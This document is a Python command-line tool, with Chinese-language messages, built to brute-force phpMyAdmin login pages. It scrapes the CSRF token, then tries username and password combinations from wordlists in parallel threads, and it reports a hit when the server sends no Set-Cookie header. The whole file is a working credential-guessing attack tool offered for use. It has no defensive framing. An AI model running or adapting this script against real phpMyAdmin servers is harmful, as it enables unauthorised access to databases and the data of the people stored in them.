import re
import requests
import argparse
import sys
import threadpool
import os


banner="""
 ___           _____     _      _                 _   
(  _`\ /'\_/`\(  _  )   ( )    (_ )              ( )_ 
| |_) )|     || (_) |   | |_    | |    _ _   ___ | ,_)
| ,__/'| (_) ||  _  |   | '_`\  | |  /'_` )/',__)| |  
| |    | | | || | | |   | |_) ) | | ( (_| |\__, \| |_ 
(_)    (_) (_)(_) (_)   (_,__/'(___)`\__,_)(____/`\__)
							
"""

usernames = []
passwords = []
url = ''
username = ''


def dict_list(login_user, login_users, login_pass, login_passs):
	if login_user:
		usernames.append(login_user)
	if login_users:
		with open(login_users, 'r') as fp:
			users = fp.read().split('\n')
			for i in users:
				usernames.append(i)
	if login_pass:
		passwords.append(login_pass)
	if login_passs:
		with open(login_passs, 'r') as fp:
			passs = fp.read().split('\n')
			for i in passs:
				passwords.append(i)


def pma(password):
	headers = {
	"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"
	}
	try:
		response = requests.Session()
		res = response.get(url)
		token = re.search('input.*value=\"(.*?)\"', res.text, re.S).group(1)
		
		data={
	        'pma_username':username,
	        'pma_password':password,
	        'server':'1',
	        'token':token
	    }

		r=response.post(url,data=data,headers=headers)
		if 'Set-Cookie' not in r.headers:
			print("[+]","-" * 100)
			print("")
			print("[+] 用户名%s 密码%s爆破成功" % (username, password))
			print("")
			print("[+]","-" * 100)
			os._exit(0)
		else:
			print("\r[-] 用户名%s 密码%s不正确                    \r" % (username, password), end="")
	except Exception as e:
		pass


def main():
	print(banner)
	if len(sys.argv) == 1:
		print('Welcome To PMA blast ! ')
		print("usage : python3 pma.py -u url -l name -P pass.txt ")
		print('usage :请使用-h查看更多信息')
		sys.exit(1)

	usage = """
			python3 pma.py -u url -l user -P passtxt
			python3 pma.py -u url -L user.txt -P pass.txt -T Thread
			python3 pma.py -u url -l user -P passtxt -T Thread
			"""

	parser = argparse.ArgumentParser(usage=usage)
	parser.add_argument("-u", type=str, help='phpmyadmin url')
	parser.add_argument("-l", type=str, help='登陆用户名')
	parser.add_argument("-L", type=str, help='登陆用户名字典')
	parser.add_argument("-p", type=str, help='登陆密码')
	parser.add_argument("-P", type=str, help='登陆密码字典')
	parser.add_argument("-T", type=int, help='线程默认为10')
	args = parser.parse_args()
	
	thread = 10
	if args.T:
		thread = args.T

	global url
	url = args.u

	dict_list(args.l, args.L, args.p, args.P)
	
	for i in usernames:
		global username
		username = i
		pool=threadpool.ThreadPool(thread)
		reqs=threadpool.makeRequests(pma,passwords)
		[pool.putRequest(req) for req in reqs]
		pool.wait()


if __name__ == '__main__':
	main()

